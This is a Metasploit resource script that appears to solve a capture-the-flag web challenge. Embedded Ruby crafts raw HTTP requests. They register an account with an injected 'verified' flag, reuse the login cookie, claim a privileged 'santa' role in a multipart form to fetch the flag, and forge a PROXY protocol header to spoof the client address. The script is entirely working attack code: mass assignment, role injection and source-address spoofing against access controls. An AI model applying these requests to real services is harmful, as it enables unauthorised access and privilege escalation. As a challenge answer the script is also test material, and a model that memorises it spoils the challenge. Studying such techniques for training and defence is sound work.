spool msf.log

<ruby>
host = '08fccd581446cc9a.julec.tf'
user = 'msfuser1'
pass = 'Password1!'

reg_body = %Q|{"username":"#{user}","password":"#{pass}","verified":true}|
reg = "POST /api/workshop/register HTTP/1.1\r\nHost: #{host}\r\nContent-Type: application/json\r\nContent-Length: #{reg_body.bytesize}\r\nConnection: close\r\n\r\n#{reg_body}\r\n"
File.write('msf_reg.txt', reg)

login_body = %Q|{"username":"#{user}","password":"#{pass}"}|
login = "POST /api/workshop/login HTTP/1.1\r\nHost: #{host}\r\nContent-Type: application/json\r\nContent-Length: #{login_body.bytesize}\r\nConnection: close\r\n\r\n#{login_body}\r\n"
File.write('msf_login.txt', login)
</ruby>

connect -s -C -i msf_reg.txt 08fccd581446cc9a.julec.tf 443
connect -s -C -i msf_login.txt 08fccd581446cc9a.julec.tf 443

# manually set your cookie from the login response:
# setg BONUS_COOKIE connect.sid=s%3A...<value from Set-Cookie>...

<ruby>
host = '08fccd581446cc9a.julec.tf'
cookie = framework.datastore['BONUS_COOKIE']
notices = "GET /api/workshop/notices HTTP/1.1\r\nHost: #{host}\r\nCookie: #{cookie}\r\nConnection: close\r\n\r\n"
File.write('msf_notices.txt', notices)

boundary = '----msf'
body = "--#{boundary}\r\nContent-Disposition: form-data; name=\"roles\"\r\n\r\n[\"santa\"]\r\n--#{boundary}\r\nContent-Disposition: form-data; name=\"presentname\"\r\n\r\nflag\r\n--#{boundary}--\r\n"
plain = "PROXY TCP4 1.2.3.4 5.6.7.8 4242 1337\r\nPOST /present/info HTTP/1.1\r\nHost: #{host}\r\nContent-Type: multipart/form-data; boundary=#{boundary}\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}"
File.write('msf_bonus_plain.txt', plain)
tls = "POST /present/info HTTP/1.1\r\nHost: #{host}:1337\r\nContent-Type: multipart/form-data; boundary=#{boundary}\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}"
File.write('msf_bonus_tls.txt', tls)
</ruby>

connect -s -C -i msf_notices.txt 08fccd581446cc9a.julec.tf 443
connect -C -i msf_bonus_plain.txt 08fccd581446cc9a.julec.tf 1337
connect -C -i msf_bonus_tls.txt 08fccd581446cc9a.julec.tf 1337

spool off
exit